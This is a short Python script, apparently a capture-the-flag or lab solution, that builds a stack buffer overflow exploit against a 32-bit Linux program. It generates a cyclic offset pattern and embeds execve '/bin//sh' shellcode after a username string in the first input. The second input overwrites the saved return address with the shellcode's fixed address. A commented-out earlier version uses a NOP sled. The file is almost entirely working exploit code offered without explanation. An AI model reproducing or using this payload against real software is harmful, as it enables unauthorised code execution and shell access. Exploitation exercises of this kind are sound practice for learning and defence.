import struct
import sys
from itertools import cycle, islice

def main():

    # Create  pattern
    chars = list(chr(c) for c in range(ord('A'), ord('Z')+1)) + [str(d) for d in range(1, 10)]
    cyclic_chars = cycle(chars)

    pattern = ''.join([next(cyclic_chars)*4 for _ in range(len(chars))])
    print(pattern)

    # # Create payload - buffer address issue

    # start_addr = 0xffffd6bc
    # ebp = 0xffffd708
    # offset = ebp + 4 - start_addr
    # print(f"Offset: {offset}")
    # shellcode = (
    #     b"\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68"
    #     b"\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89"
    #     b"\xE1\xB0\x0B\xCD\x80"
    # )
   
    # print(f"Shellcode: {len(shellcode)}")

    # payload = b"\x90" * (offset - len(shellcode) - 3) + shellcode + b"\x90" * 3 +  struct.pack("<I", start_addr)
    # print(payload)


    # Create payload - OK

    shellcode = (
        b"\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68"
        b"\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89"
        b"\xE1\xB0\x0B\xCD\x80"
    )

    input1 = b"dat_wil" + shellcode + b"\n"

    pass_addr = 0xffffd6bc
    ebp = 0xffffd708
    offset = ebp + 4 - pass_addr
    print(f"Offset: {offset}")

    name_addr = 0x804a040
    shellcode_addr = name_addr + 7 # "dat_wil" = 7 bytes

    intput2 = b"A" * offset +  struct.pack("<I", shellcode_addr) + b"\n"
    payload = input1 + intput2
    print(payload)

if __name__ == "__main__":
    main()
